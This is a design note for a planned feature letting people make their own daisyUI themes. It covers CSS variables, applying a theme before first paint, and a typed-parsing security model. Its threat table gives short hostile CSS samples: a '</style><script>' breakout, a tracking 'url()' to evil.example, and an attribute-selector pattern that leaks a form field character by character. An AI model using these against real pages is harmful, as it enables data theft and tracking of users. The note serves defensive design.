# Themes: ones a person makes

Written 2026-11-23, as research only: whether a person could make a
daisyUI theme of their own, keep it in the database, and use it in the
app, and what that asks of security. Nothing is built; planned before
it is.

## How a daisyUI theme works

`svelte/src/lib/theme.css` builds daisyUI with `themes: all`, and
`svelte/src/lib/theme_script.js` picks one by `data-theme` on `<html>`.
A theme is only a block of CSS custom properties:

```css
[data-theme="cupcake"] {
  color-scheme: light;
  --color-base-100: oklch(...);   /* base-100/200/300, base-content */
  --color-primary: oklch(...);    /* and primary-content, secondary, accent, */
  ...                             /* neutral, info, success, warning, error,  */
                                  /* each with its -content                  */
  --radius-selector: 1rem;  --radius-field: 0.5rem;  --radius-box: 1rem;
  --size-selector: 0.25rem; --size-field: 0.25rem;
  --border: 1px;  --depth: 1;  --noise: 0;
}
```

Every component, and Tailwind's `bg-primary` and the like, reads them
through `var(...)`, so a theme of a person's own needs no rebuild: about
25 variables set at runtime, the same list daisyUI's theme generator
exports.

## Applying it

1. **Set each variable from JavaScript**, preferred:
   `document.documentElement.style.setProperty("--color-primary", value)`,
   with `data-theme` set to `custom`. One property gets one value, so
   nothing can break out into new rules or selectors, and a Content
   Security Policy doesn't block CSSOM changes like this.
2. **A stylesheet from the server**, `GET /api/themes/:id.css`, loaded by
   a `<link>`: cacheable and usable from plain HTML pages, with Rust
   writing every byte.
3. **Text built into a `<style>`**: avoid. It is string concatenation
   into CSS, where a `}` or `</style>` changes what is parsed.

The real difficulty is **no flash of the wrong theme**.
`theme_script.js` runs before the first paint and reads `localStorage`,
already caching the background for this reason. A theme of a person's
own is cached there too, all its variables, applied at once, then
refreshed from the API or Tauri command once the app loads. That
covers the app offline as well.

Where the choice lives is decided: the `theme` preference in
`accounts_preferences`, synced to the person's devices, local and trial
users included (`docs/design/locales.md`, "The theme"). A theme of a
person's own would be another table, the preference naming it by id.

## Security

CSS runs no JavaScript in today's browsers (`expression()`, `javascript:`
URLs in CSS and `-moz-binding` are gone). What it can still do:

| Risk | Needs | Example |
|---|---|---|
| HTML injection, real XSS | CSS text inserted as HTML (`{@html}`, `innerHTML`) | `</style><script>…` |
| Requests out, tracking | a value with `url()` or `@import` | `url(https://evil.example/pixel?u=123)` |
| Reading the page out | selectors | `input[value^="a"] { background: url(evil/a) }`, a field leaked a character at a time |
| A false page, phishing | any property | the real button hidden, `::after { content: "Session expired…" }` |
| An unusable page | values without bounds | `--radius-box: 99999rem`, `--border: 500px`, unreadable contrast |

How much it matters depends on **who sees the theme**. Seen only by its
maker, it is close to nothing: they can only spoil their own screen.
Seen by others (themes shared, a gallery, a community's owner setting
one for its members), every row is an attack on someone else. With
`forum` and communities in the app, design for that case from the
start.

## Parse to types, never filter strings

Sanitizing CSS by stripping patterns leaks: escapes (`\75 rl(`),
comments and whitespace have too many forms. Instead:

1. **A fixed set of keys.** In Rust the theme is a struct, one field per
   daisyUI variable; an unknown key is refused, so there are no
   selectors and no other properties.
2. **A type for every value.** A colour is numbers,
   `Oklch { l, c, h }` or RGB from hex; radii and sizes are rem within
   a range; `--border` is px within a range; `--depth` and `--noise`
   are 0 or 1; `color-scheme` is `Light` or `Dark`. The theme's name
   in `data-theme` is its id, never the person's text.
3. **The database keeps the numbers**, not CSS: an `Accepted*` theme
   row made by validating, in its `data/` module.
4. **Rust writes the CSS values** from the struct
   (`format!("oklch({l}% {c} {h})")`), so no text from a person reaches
   the browser.

Then `url()` can't be written, a colour being three numbers; there are
no selectors or other properties; the ranges keep the page usable; and
no text goes into HTML.

Worth adding:

- **A contrast check.** Rust computes the WCAG contrast of each colour
  against its `-content`: a warning for one's own theme, a minimum for
  one that is shared.
- **Importing from daisyUI's generator.** A person pastes its exported
  CSS; Rust reads the known `--key: value` lines into the struct and
  refuses the rest, so their designer is usable and nothing raw is
  kept.
- **A Content Security Policy**, a second layer: `tauri/tauri.conf.json`
  has `"csp": null`, and the web server sends none. Limiting `img-src`,
  `style-src` and `connect-src` blocks requests out from CSS even past
  a bug, and is worth doing on its own.

## In short

- Possible: about 25 CSS variables, no rebuild.
- The hard part: applying it before the first paint, cached in
  `localStorage` beside the background.
- Safe: typed values kept, Rust writing the CSS, applied by
  `style.setProperty`, never CSS text into HTML.
- What matters most: the moment one person's theme is shown to another.
